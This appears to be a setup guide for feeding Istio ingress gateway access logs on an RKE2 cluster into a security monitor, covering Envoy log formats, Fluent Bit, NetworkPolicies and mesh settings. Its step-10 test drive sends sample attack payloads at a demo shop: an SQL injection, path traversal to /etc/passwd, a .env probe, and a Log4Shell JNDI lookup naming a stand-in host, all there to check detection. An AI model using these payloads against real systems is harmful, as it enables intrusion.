# RKE2 with Istio instead of an Ingress controller

**Scenario:** an RKE2 cluster whose microservices are exposed through the **Istio ingress gateway** (Envoy), not ingress-nginx. This guide takes you from "Istio is running" to "the security monitor is live".

It builds on the [Kubernetes guide](kubernetes-setup.md) and only describes what is different. Steps that stay the same link back to it.

> ⚠️ **Not tested in a cluster yet.** The [Kubernetes guide](kubernetes-setup.md) was run end to end with ingress-nginx. The Istio and RKE2 configuration here is based on the Istio, Envoy and RKE2 documentation, not on a test run. Every step has a ✅ check, so run them all before you rely on the setup.

```
   ┌──────────┐      ┌──────────────────────┐      ┌──────────────┐      ┌──────────────────┐
   │ Internet │ ───▶ │ istio-ingressgateway │ ───▶ │ shop/api     │      │ security/        │
   └──────────┘      │ (Envoy access log in │ mTLS │ shop/web …   │      │ security-monitor │
                     │  the event format)   │      │ (+ sidecars) │      │ (not in the mesh)│
                     └──────────┬───────────┘      └──────┬───────┘      │                  │
                                │ stdout                  │ failed       │  rules → alerts  │
                     ┌──────────▼───────────┐             │ logins       │  /metrics        │
                     │ Fluent Bit (logging) │             └────────────▶ │  /alerts         │
                     └──────────┬───────────┘    POST /events/batch      │                  │
                                └──────────────────────────────────────▶ └────────┬─────────┘
                                                                                  │ scrape
                                                                         ┌────────▼────────┐
                                                                         │ Prometheus      │
                                                                         └─────────────────┘
```

---

## What changes compared to the ingress-nginx setup

The monitor itself does not depend on the ingress. It accepts events from anyone who sends them to `POST /events` or `/events/batch`. Only the **data source** and the **network plumbing** around it change:

| Part | ingress-nginx setup | RKE2 + Istio |
|------|---------------------|--------------|
| Monitor (Deployment, Service, API, rules) | [`deployment.yaml`](../deploy/kubernetes/deployment.yaml) | unchanged |
| Namespace `security` | PSS `restricted` | unchanged, plus **out of the mesh** (step 2) |
| Access log in the event format | `log-format-upstream` in ingress-nginx | Envoy access log provider + `Telemetry` (step 5) |
| Real client IP | `externalTrafficPolicy`, `use-forwarded-headers`, PROXY protocol | `externalTrafficPolicy`, `gatewayTopology` (step 5c) |
| Fluent Bit input | `*_ingress-nginx_controller-*.log` | `*_istio-system_istio-proxy-*.log` + a `nest` filter (step 6) |
| Client IP in service events (step 7) | `X-Real-IP` | `X-Envoy-External-Address` |
| DNS kit | `coredns-*` pods | `rke2-coredns-rke2-coredns-*` pods |
| NetworkPolicy | needs an enforcing CNI | RKE2's default CNI Canal enforces it |

## 🔧 Assumptions

- RKE2 with its default CNI **Canal** (or Calico/Cilium). All three enforce NetworkPolicies.
- Istio is installed with Helm (`base`, `istiod`, `gateway`) and serves your applications. The ingress gateway runs as `istio-ingressgateway` in `istio-system`, with the label `istio: ingressgateway`. Different names are fine; adjust the paths and selectors below.
- Application namespaces (here: `shop`) have sidecar injection enabled. The guide also works with ambient mode; the differences are noted where they matter.
- RKE2's bundled ingress-nginx is disabled because Istio replaces it. In `/etc/rancher/rke2/config.yaml` on the server nodes:
  ```yaml
  disable:
    - rke2-ingress-nginx
  ```

## ⚠️ Read this before you start

> **The monitor stays out of the mesh.** It needs no mTLS: clients authenticate with API keys, and the NetworkPolicy decides who may connect at all. A sidecar would collide with the `restricted` Pod Security Standard (`istio-init` needs `NET_ADMIN`), block the pod's start because of the egress NetworkPolicy, and lock out Fluent Bit and Prometheus under `STRICT` mTLS. If your policy says *everything* in the mesh, see the [appendix](#appendix-running-the-monitor-inside-the-mesh).

> **The real client IP or nothing.** This is the most important point, as in the Kubernetes guide. With Istio it comes down to how traffic reaches the gateway, see step 5c.

> **RKE2 with `profile: cis`.** The CIS profile enforces the `restricted` Pod Security Standard on every namespace without its own label. The monitor is fine with that, but Fluent Bit (step 6) mounts host paths and needs `privileged`.

---

## Step 1 — Build the monitor 🏗️

Unchanged: [Kubernetes guide, step 1](kubernetes-setup.md#step-1--build-the-monitor-️).

## Step 2 — Unfold the namespace, outside the mesh 📂

```bash
kubectl apply -f deploy/kubernetes/namespace.yaml
kubectl label namespace security istio-injection=disabled
```

If you use revision-based injection (`istio.io/rev=…`), make sure the namespace carries no `istio.io/rev` label. In ambient mode, make sure it has no `istio.io/dataplane-mode=ambient` label.

✅ **Check:** `kubectl get ns security --show-labels` shows `pod-security.kubernetes.io/enforce=restricted` and `istio-injection=disabled`.

## Step 3 — Cut the keys 🔑 and Step 4 — Mount the monitor 🔩

Unchanged: [step 3](kubernetes-setup.md#step-3--cut-the-keys-) and [step 4](kubernetes-setup.md#step-4--mount-the-monitor-) of the Kubernetes guide.

✅ **Check:** `kubectl -n security get pod` shows the pod with **`1/1`** containers. `2/2` means a sidecar was injected; go back to step 2 and delete the pod.

## Step 5 — Teach the gateway to speak "event" 🗣️

ingress-nginx is told *what* to log with `log-format-upstream`. In Istio you do this with an **access log provider** in the mesh configuration, and a **`Telemetry`** resource that turns it on **only for the ingress gateway**. Then the sidecars keep logging as before, and the monitor only receives traffic entering the cluster.

**a) Add the provider to the mesh configuration** (Helm values of the `istiod` chart; with `IstioOperator` put it under `spec.meshConfig`):

```yaml
meshConfig:
  extensionProviders:
    - name: secmon
      envoyFileAccessLog:
        path: /dev/stdout
        logFormat:
          labels:
            timestamp: "%START_TIME%"
            ip: "%DOWNSTREAM_REMOTE_ADDRESS_WITHOUT_PORT%"
            event_type: "http_request"
            path: "%REQ(X-ENVOY-ORIGINAL-PATH?:PATH)%"
            status_code: "%RESPONSE_CODE%"
            user_agent: "%REQ(USER-AGENT)%"
            message: "%REQ(:METHOD)% %REQ(X-ENVOY-ORIGINAL-PATH?:PATH)% %PROTOCOL%"
            metadata_method: "%REQ(:METHOD)%"
            metadata_host: "%REQ(:AUTHORITY)%"
            metadata_referer: "%REQ(REFERER)%"
            metadata_upstream: "%UPSTREAM_CLUSTER%"
            metadata_source: "istio-gateway"
```

Save the block as `istiod-secmon-values.yaml`. `--reuse-values` keeps your existing settings. If you already have `meshConfig.extensionProviders`, add `secmon` to that list: Helm replaces lists, it does not merge them.

```bash
helm upgrade istiod istio/istiod -n istio-system --reuse-values -f istiod-secmon-values.yaml
```

A few things about this format:

- `labels` produces one JSON object per request. Envoy writes a value that consists of a single operator with its own type, so `%RESPONSE_CODE%` becomes the number `200`, not the string `"200"`. The monitor requires a number in `status_code`.
- `labels` can only produce flat keys. The monitor expects `metadata` as an object, so Fluent Bit nests the `metadata_*` keys in step 6.
- `%UPSTREAM_CLUSTER%` names the targeted microservice, e.g. `outbound|80||api.shop.svc.cluster.local`. It replaces ingress-nginx's `$namespace` / `$service_name`. Rules can use it as `metadata.upstream`.
- `X-ENVOY-ORIGINAL-PATH` is the path before a `VirtualService` rewrite, i.e. what the attacker sent.

**b) Enable the provider for the gateway only:**

```yaml
apiVersion: telemetry.istio.io/v1
kind: Telemetry
metadata:
  name: secmon-access-log
  namespace: istio-system # the gateway's namespace
spec:
  selector:
    matchLabels:
      istio: ingressgateway
  accessLogging:
    - providers:
        - name: secmon
```

If your Istio is older than 1.22, use `apiVersion: telemetry.istio.io/v1alpha1`. With the **Kubernetes Gateway API** instead of an Istio `Gateway`, the gateway pods are created automatically as `<gateway-name>-istio`. Select them with `gateway.networking.k8s.io/gateway-name: <gateway-name>` and create the `Telemetry` in the gateway's namespace.

✅ **Check:** send any request through the gateway, then

```bash
kubectl -n istio-system logs deploy/istio-ingressgateway --tail=1
```

shows a JSON line like

```json
{"timestamp":"2026-10-01T09:12:44.118Z","ip":"203.0.113.14","event_type":"http_request","path":"/api/products?id=1","status_code":200,"user_agent":"Mozilla/5.0 …","message":"GET /api/products?id=1 HTTP/1.1","metadata_method":"GET","metadata_host":"shop.example.com","metadata_referer":null,"metadata_upstream":"outbound|80||api.shop.svc.cluster.local","metadata_source":"istio-gateway"}
```

Check that `status_code` has no quotes and that `ip` is a real client address, not your load balancer (step 5c).

> If `meshConfig.accessLogFile` is already set mesh-wide, the gateway writes two lines per request: the default one and this one. Fluent Bit only forwards lines with `event_type` (step 6), so the default lines do no harm, but they do double the gateway's log volume.

**c) Real client IP.** Every rule counts per IP, so `ip` must be the client and not the last hop. Pick what matches how traffic reaches the gateway:

| Traffic reaches the gateway via | Setting | Where |
|---------------------------------|---------|-------|
| L4 load balancer or NodePort that keeps the source IP (MetalLB, kube-vip, RKE2's ServiceLB, an external TCP balancer pointing at NodePorts) | `service.externalTrafficPolicy: Local` | Helm values of the `gateway` chart |
| L7 load balancer / CDN that sets `X-Forwarded-For` | `gatewayTopology.numTrustedProxies: <number of proxies in front>` | `proxy.istio.io/config` annotation on the gateway pods, or `meshConfig.defaultConfig.gatewayTopology` |
| TCP balancer with PROXY protocol (e.g. HAProxy, F5) | `gatewayTopology.proxyProtocol: {}` (Istio 1.24+; older: an `EnvoyFilter` with the `proxy_protocol` listener filter) | as above |

Example for one L7 load balancer in front of the gateway (Helm values of the `gateway` chart):

```yaml
podAnnotations:
  proxy.istio.io/config: '{"gatewayTopology":{"numTrustedProxies":1}}'
```

With `numTrustedProxies`, Envoy takes the client address from `X-Forwarded-For`, and `%DOWNSTREAM_REMOTE_ADDRESS_WITHOUT_PORT%` then names the client.

> ⚠️ Only trust `X-Forwarded-For` if clients **cannot reach the gateway directly**, past the load balancer. Otherwise anyone can put any IP into the header, evade the per-IP rules or get other IPs flagged.

✅ **Check:** request the shop from a machine **outside** the cluster and compare `ip` in the gateway log with that machine's public address (`curl ifconfig.me`).

## Step 6 — Connect the log shipper 🚚

Install Fluent Bit as in [step 6 of the Kubernetes guide](kubernetes-setup.md#step-6--connect-the-log-shipper-), with two changes to a copy of [`fluent-bit-values.yaml`](../deploy/kubernetes/fluent-bit-values.yaml).

**First:** the namespace `logging` stays out of the mesh. On RKE2 with `profile: cis` it also needs `privileged`, because Fluent Bit reads `/var/log` from the node:

```bash
kubectl create namespace logging
kubectl label namespace logging istio-injection=disabled
kubectl label namespace logging pod-security.kubernetes.io/enforce=privileged   # only with profile: cis
```

**Second:** read the gateway's log instead of the ingress controller's and nest the `metadata_*` keys. Replace the first `[INPUT]` and add one filter after the `grep` filter for `secmon.ingress.*`:

```ini
    # Access log of the Istio ingress gateway (written in the event format, see step 5).
    [INPUT]
        Name              tail
        Tag               secmon.ingress.*
        Path              /var/log/containers/istio-ingressgateway-*_istio-system_istio-proxy-*.log
        multiline.parser  docker, cri
        Mem_Buf_Limit     20MB
        Skip_Long_Lines   On
        Refresh_Interval  5
```

```ini
    # Envoy writes metadata_method, metadata_host, …; the monitor expects metadata.{method,host,…}.
    [FILTER]
        Name           nest
        Match          secmon.ingress.*
        Operation      nest
        Wildcard       metadata_*
        Nest_under     metadata
        Remove_prefix  metadata_
```

The `parser` and `grep` filters stay as they are. The `istio-proxy` container also writes Envoy's and pilot-agent's own log lines. These are not JSON or have no `event_type`, and `grep` drops them.

✅ **Check:** after some traffic through the gateway:

```bash
curl -s -H "Authorization: Bearer $SHOP_KEY" "localhost:8080/events?limit=2"
```

```json
{"count":2,"total":8,"events":[{"ip":"203.0.113.14","event_type":"http_request","path":"/","status_code":200,"metadata":{"method":"GET","host":"shop.example.com","upstream":"outbound|80||frontend.shop.svc.cluster.local","source":"istio-gateway",…}},…]}
```

`metadata` must be an object. If you see `metadata_method` etc. as top-level keys instead, the `nest` filter does not run.

## Step 7 — Let the services report what the gateway can't see 📣

The same as [step 7 of the Kubernetes guide](kubernetes-setup.md#step-7--let-the-services-report-what-the-ingress-cant-see-), with three differences.

**The client IP comes from a different header.** Istio does not set `X-Real-IP`. The service sees its own sidecar as the remote address, and the gateway passes the client in `X-Envoy-External-Address`:

```go
clientIP := r.Header.Get("X-Envoy-External-Address") // set by the Istio ingress gateway
```

Only trust this header if the service is reachable **only through the gateway**. Otherwise a pod inside the cluster can set any value. An `AuthorizationPolicy` that only lets in the gateway's service account ensures this.

**The mesh must let the call out.** The service's sidecar talks to the monitor, which has no sidecar. Istio's auto mTLS notices this and sends plain HTTP, which is what the monitor expects. Three mesh settings can still block the call:

| You have | Symptom | Fix |
|----------|---------|-----|
| A mesh-wide `DestinationRule` with `tls.mode: ISTIO_MUTUAL` | `503`, `upstream connect error … connection termination` | A `DestinationRule` for the monitor with `tls.mode: DISABLE` (below) |
| A `Sidecar` resource limiting `egress.hosts` | `502` / `404 NR` from the sidecar | Add `security/security-monitor.security.svc.cluster.local` to `egress.hosts` |
| `outboundTrafficPolicy: REGISTRY_ONLY` | nothing; Kubernetes services are in the registry | – |

```yaml
apiVersion: networking.istio.io/v1
kind: DestinationRule
metadata:
  name: security-monitor
  namespace: security
spec:
  host: security-monitor.security.svc.cluster.local
  trafficPolicy:
    tls:
      mode: DISABLE
```

**The NetworkPolicy still applies.** In sidecar mode the call leaves the pod with the pod's IP, so the namespace label from the Kubernetes guide works unchanged:

```bash
kubectl label namespace shop security-monitor/client=true
```

✅ **Check:** five failed logins from one IP within a minute produce a `BruteForce` alert with the **client's** IP, not `127.0.0.6` or a pod IP.

## Step 8 — Lock the doors 🔒

Unchanged: [step 8 of the Kubernetes guide](kubernetes-setup.md#step-8--lock-the-doors-). RKE2's Canal enforces NetworkPolicies, so the `outsider` check must time out.

On RKE2 with `profile: cis`, RKE2 also creates its own NetworkPolicies in `kube-system`, `kube-public` and `default`. They allow DNS, so the monitor's DNS egress rule is unaffected.

## Step 9 — Hang up the alarm bell 🔔 *(optional, recommended)*

As in [step 9 of the Kubernetes guide](kubernetes-setup.md#step-9--hang-up-the-alarm-bell--optional-recommended). The monitor is outside the mesh, so Prometheus scrapes `/metrics` over plain HTTP. Two RKE2-specific points:

- **Rancher Monitoring** (the `rancher-monitoring` chart) runs Prometheus in `cattle-monitoring-system`, not in `monitoring`. Change the namespace in the NetworkPolicy's third `from` entry, otherwise the scrape times out.
- Set the `release:` label in [`monitoring.yaml`](../deploy/kubernetes/monitoring.yaml) to what your Prometheus selects:
  ```bash
  kubectl get prometheus -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {.spec.serviceMonitorSelector}{"\n"}{end}'
  ```
  An empty selector (`{}`) selects every ServiceMonitor; then the label does not matter.

✅ **Check:** the target `security-monitor` is `UP` in Prometheus.

## Step 10 — Test drive 🚗

Route the demo shop through the gateway instead of an Ingress. Apply [`demo/shop.yaml`](../deploy/kubernetes/demo/shop.yaml) without its `Ingress` and add:

```yaml
apiVersion: networking.istio.io/v1
kind: Gateway
metadata:
  name: shop
  namespace: shop
spec:
  selector:
    istio: ingressgateway
  servers:
    - port: { number: 80, name: http, protocol: HTTP }
      hosts: ["shop.local"]
---
apiVersion: networking.istio.io/v1
kind: VirtualService
metadata:
  name: shop
  namespace: shop
spec:
  hosts: ["shop.local"]
  gateways: ["shop"]
  http:
    - match: [{ uri: { prefix: /api } }]
      route: [{ destination: { host: api } }]
    - route: [{ destination: { host: frontend } }]
```

Then run the attacker from the [Kubernetes guide's step 10](kubernetes-setup.md#step-10--test-drive-) against the gateway:

```bash
kubectl run attacker --rm -it --image=curlimages/curl --restart=Never -- sh -c '
  H="Host: shop.local"; B=http://istio-ingressgateway.istio-system.svc
  curl -s -o /dev/null -H "$H" "$B/.env"
  curl -s -o /dev/null -H "$H" "$B/api/search?q=%27%20OR%201%3D1--"
  curl -s -o /dev/null -H "$H" "$B/api/files?name=..%2f..%2fetc%2fpasswd"
  curl -s -o /dev/null -H "$H" -A "sqlmap/1.8" "$B/api/products?id=1"
  curl -s -o /dev/null -H "$H" -A "\${jndi:ldap://evil.example/a}" "$B/"'

curl -s -H "Authorization: Bearer $SHOP_KEY" "localhost:8080/alerts?limit=10"
```

✅ **Expected:** the same five alerts as in the Kubernetes guide (`CommandInjection`, `MultiVector`, `SQLInjection`, `ScannerUserAgent`, `SensitivePath`). The IP is the `attacker` pod's IP, from RKE2's default pod network `10.42.0.0/16`.

---

## Going live ✅

The test drive shows that the pipeline works. Before you rely on it in production:

| | Check | How |
|-|-------|-----|
| ☐ | Real client IP from outside | Step 5c check from a machine outside the cluster; alerts must never all show the same IP |
| ☐ | Monitor is outside the mesh | `kubectl -n security get pod` → `1/1` |
| ☐ | NetworkPolicy enforced | `outsider` check from step 8 times out |
| ☐ | Events arrive continuously | `security_events_total` increases; `SecurityMonitorNoEvents` (step 9) is active |
| ☐ | Alerts reach a person | Alertmanager routes `SecurityAlertCritical` to on-call, `SecurityAlertHigh` to a channel |
| ☐ | Own traffic is allow-listed | Uptime checks, load balancer health checks and your own vulnerability scanners in `except` (Kit C), or they trigger `RapidFire` / `ScannerUserAgent` |
| ☐ | Memory fits the traffic | Requests per day × retention fits `MAX_EVENTS` (≈ 0.9 KiB per event); `SecurityMonitorEvictingEarly` is quiet |
| ☐ | Keys are per client and stored | One key per client in a secret store; rotation tried once ([care instructions](kubernetes-setup.md#care-instructions-)) |
| ☐ | AI analysis decided | With: secret contains the key, HTTPS egress stays. Without: remove the port-443 egress rule from the NetworkPolicy |

**Roll out in two phases.** Run one or two weeks with alerts going to a low-priority channel only. Tune rules for what your traffic looks like (allow-lists, thresholds, see [Kit C](kubernetes-setup.md#kit-c--your-own-rules-)), then route critical alerts to on-call. A monitor that pages for every health check gets ignored in the first week.

---

## Extra kits on RKE2

**Kit A — DNS:** RKE2's CoreDNS is the `rke2-coredns` Helm chart, so pods, ConfigMap and log files have different names:

1. Enable query logging through the chart, not by editing the ConfigMap (RKE2 would overwrite it). Create `/var/lib/rancher/rke2/server/manifests/rke2-coredns-config.yaml` on a server node:
   ```yaml
   apiVersion: helm.cattle.io/v1
   kind: HelmChartConfig
   metadata:
     name: rke2-coredns
     namespace: kube-system
   spec:
     valuesContent: |-
       servers:
         - zones:
             - zone: .
           port: 53
           plugins:
             - name: errors
             - name: log
             - name: health
               configBlock: |-
                 lameduck 5s
             - name: ready
             - name: kubernetes
               parameters: cluster.local in-addr.arpa ip6.arpa
               configBlock: |-
                 pods insecure
                 fallthrough in-addr.arpa ip6.arpa
                 ttl 30
             - name: prometheus
               parameters: 0.0.0.0:9153
             - name: forward
               parameters: . /etc/resolv.conf
             - name: cache
               parameters: 30
             - name: loop
             - name: reload
             - name: loadbalance
   ```
   `servers` replaces the whole server block, so compare it with your current Corefile first (`kubectl -n kube-system get configmap rke2-coredns-rke2-coredns -o yaml`) and keep anything you changed.
2. Change the DNS input's path in `fluent-bit-values.yaml`:
   ```ini
       Path              /var/log/containers/rke2-coredns-rke2-coredns-*_kube-system_coredns-*.log
   ```
3. The NetworkPolicy allows DNS to pods labelled `k8s-app: kube-dns` in `kube-system`. Check that RKE2's CoreDNS pods carry it: `kubectl -n kube-system get pods -l k8s-app=kube-dns`.

**Kit B — AI analysis** and **Kit C — your own rules:** unchanged. With Istio, `metadata.upstream` is useful for per-service rules (`"group_by": "metadata.upstream"`).

---

## Bonus: service-to-service traffic 🕸️

The Kubernetes guide lists service-to-service traffic as a blind spot, because it never passes the ingress. With Istio, every sidecar can write the same access log. Enable the `secmon` provider for a namespace in addition to the gateway:

```yaml
apiVersion: telemetry.istio.io/v1
kind: Telemetry
metadata:
  name: secmon-access-log
  namespace: shop # without a selector: every sidecar in the namespace
spec:
  accessLogging:
    - providers:
        - name: secmon
```

and add a second Fluent Bit input for `/var/log/containers/*_shop_istio-proxy-*.log` with the same tag and filters.

Then a compromised pod that probes other services for `/.env`, SQL injection or path traversal raises the same alerts as an attacker from outside. `ip` is the calling pod's IP.

Two things to be aware of:

- **Volume.** Every internal request becomes an event, and a request through the gateway shows up twice (once at the gateway, once at the service's sidecar). Size `MAX_EVENTS` and memory for it.
- **Noise.** Chatty internal clients trip the threshold rules. Exclude the pod network from rules that only make sense for external clients, e.g. in `RapidFire` and `DirectoryEnumeration`:
  ```json
  "when": { "except": [{ "ip": ["10.42.0.0/16"] }] }
  ```
  (`10.42.0.0/16` is RKE2's default `cluster-cidr`.) Keep the signature rules for internal traffic: an injection attempt is never normal.

---

## Troubleshooting

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| Monitor pod stuck in `Init` or rejected with `violates PodSecurity "restricted"` | A sidecar was injected | Step 2: `istio-injection=disabled` on the namespace, delete the pod |
| Gateway log has no JSON lines | `Telemetry` selector does not match the gateway pods, or istiod was not updated | `kubectl -n istio-system get pods --show-labels` against the selector; `istioctl analyze -n istio-system` |
| `GET /events` stays empty | Fluent Bit path does not match | `kubectl -n logging logs ds/fluent-bit` shows the watched files (`inotify_fs_add`); the container name in the gateway pod is `istio-proxy` |
| Fluent Bit pods are not created | `logging` namespace under `restricted` (RKE2 `profile: cis`) | Step 6: label it `privileged` |
| Batch requests rejected with 400 | `status_code` is a string, or `metadata` is not an object | Step 5 check (no quotes), step 6 `nest` filter |
| Every alert has the same IP | Load balancer or node IP, not the client's | Step 5c |
| Service events have IP `127.0.0.6` | Service uses its remote address or `X-Real-IP` | Step 7: `X-Envoy-External-Address` |
| Service calls to the monitor fail with 503 | Mesh-wide `ISTIO_MUTUAL` | Step 7: `DestinationRule` with `tls.mode: DISABLE` |
| Prometheus target `DOWN` (timeout) | Prometheus in `cattle-monitoring-system` | Step 9: adjust the NetworkPolicy |

Everything else: [troubleshooting in the Kubernetes guide](kubernetes-setup.md#care-instructions-).

---

## Appendix: running the monitor inside the mesh

If your policy requires every workload in the mesh, it works, with these changes:

| Problem | Why | Fix |
|---------|-----|-----|
| Pod rejected by PSS `restricted` | `istio-init` needs `NET_ADMIN` / `NET_RAW` | Install Istio with the **Istio CNI** node agent (`istio/cni` chart), or use ambient mode |
| Pod never becomes ready | The egress NetworkPolicy only allows DNS and 443; the sidecar cannot reach istiod | Allow egress to istiod on port 15012 (below) |
| Fluent Bit and Prometheus are rejected | They are outside the mesh; `STRICT` mTLS refuses plain HTTP | `PERMISSIVE` for port 8080 (below) |
| Ambient: nothing reaches the monitor | ztunnel delivers inbound traffic over HBONE on port **15008**; kubelet probes come from `169.254.7.127` | Allow 15008 and the probe address in the ingress policy (below) |
| AI analysis fails | `outboundTrafficPolicy: REGISTRY_ONLY` blocks `api.anthropic.com` | A `ServiceEntry` for the provider's host |

Additions to [`networkpolicy.yaml`](../deploy/kubernetes/networkpolicy.yaml):

```yaml
  egress:
    # … existing rules …
    - to: # sidecar → istiod (configuration and certificates)
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: istio-system
          podSelector:
            matchLabels:
              app: istiod
      ports:
        - port: 15012
          protocol: TCP
  ingress:
    # … existing rule, plus for ambient mode:
    - ports:
        - port: 15008 # HBONE; ztunnel checks identities, the NetworkPolicy only sees the port
          protocol: TCP
    - from:
        - ipBlock:
            cidr: 169.254.7.127/32 # kubelet probes in ambient mode
```

mTLS for meshed clients, plain HTTP for Fluent Bit and Prometheus:

```yaml
apiVersion: security.istio.io/v1
kind: PeerAuthentication
metadata:
  name: security-monitor
  namespace: security
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: security-monitor
  mtls:
    mode: STRICT
  portLevelMtls:
    8080:
      mode: PERMISSIVE
```

Remove the `DestinationRule` from step 7 again, so meshed clients use mTLS. Allow for the sidecar's memory and CPU in the namespace's quotas. The monitor's own `limits.memory` and `GOMEMLIMIT` stay unchanged.

The result is encrypted traffic from meshed services to the monitor. It does not detect any more attacks than the setup above.
